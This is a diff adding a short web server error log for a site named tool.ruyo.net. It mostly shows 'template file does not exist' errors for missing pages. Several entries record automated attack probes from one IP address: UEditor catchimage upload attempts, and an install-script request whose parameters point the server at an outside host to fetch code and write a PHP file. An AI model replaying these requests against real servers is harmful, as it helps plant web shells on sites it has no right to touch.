@@ -1,0 +1,40 @@
+---------------------------------------------------------------
+
+[2022-04-06T08:36:50+08:00] 65.21.165.219 GET tool.ruyo.net/ads.txt
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/ads.html
+---------------------------------------------------------------
+
+[2022-04-06T08:36:52+08:00] 65.21.165.219 GET tool.ruyo.net/ads.txt
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/ads.html
+---------------------------------------------------------------
+
+[2022-04-06T08:36:59+08:00] 65.21.165.219 GET tool.ruyo.net/ads.txt
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/ads.html
+---------------------------------------------------------------
+
+[2022-04-06T10:54:55+08:00] 207.46.13.75 GET tool.ruyo.net/30000.html
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/30000.html
+---------------------------------------------------------------
+
+[2022-04-06T19:33:28+08:00] 112.23.191.11 GET tool.ruyo.net/static/style/fonts/glyphicons-halflings-regular.eot?
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/static.html
+---------------------------------------------------------------
+
+[2022-04-06T21:53:23+08:00] 38.55.216.181 POST tool.ruyo.net/Ueditor/net/controller.ashx?action=catchimage
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Ueditor.html
+---------------------------------------------------------------
+
+[2022-04-06T21:53:23+08:00] 38.55.216.181 POST tool.ruyo.net/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=swamg.php&updateHost=http://2.bj33.cc/
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/install.html
+---------------------------------------------------------------
+
+[2022-04-06T21:53:23+08:00] 38.55.216.181 POST tool.ruyo.net/Ueditor/controller.ashx?action=catchimage
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Ueditor.html
+---------------------------------------------------------------
+
+[2022-04-06T21:53:23+08:00] 38.55.216.181 POST tool.ruyo.net/Ueditor/net/controller.ashx?action=catchimage
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Ueditor.html
+---------------------------------------------------------------
+
+[2022-04-06T21:53:23+08:00] 38.55.216.181 GET tool.ruyo.net/e/aspx/upload.aspx?a=pageadmin_cms
+[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/e.html
